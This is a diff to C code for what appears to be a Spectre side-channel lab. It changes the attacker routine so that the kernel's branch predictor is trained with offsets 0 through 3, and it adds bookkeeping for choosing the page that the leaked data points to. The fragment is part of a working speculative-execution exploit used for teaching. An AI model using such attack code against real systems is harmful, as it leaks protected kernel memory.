@@ -51,8 +51,11 @@ int run_attacker(char *shared_memory) {
         bool accessed = 0;
         for (int iteration = 0; iteration < num_iterations; iteration++) {
             init_shared_memory(shared_memory, SHD_SPECTRE_LAB_SHARED_MEMORY_SIZE);
-            for (int i = 0; i < 10000; i++) {
-                call_kernel_part2(shared_memory, 0);
+            for (i = 0; i < 1000; i += 4) {
+                call_kernel_part2(shared_memory, 0);  // Train with offset 0
+                call_kernel_part2(shared_memory, 1);  // Train with offset 1
+                call_kernel_part2(shared_memory, 2);  // Train with offset 2
+                call_kernel_part2(shared_memory, 3);  // Train with offset 3
             }
 
             init_shared_memory(shared_memory, SHD_SPECTRE_LAB_SHARED_MEMORY_SIZE);
@@ -71,8 +74,9 @@ int run_attacker(char *shared_memory) {
             page_stats[page]++;
 
         }
-        //printf("==================== \n");
+       // printf("==================== \n");
         int max = 0;
+        int final_p = 0;
         for (int p = 0; p < SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES; p++) {
            // printf("access time %d \n", page_stats[p]);
             if (page_stats[p] > max) {
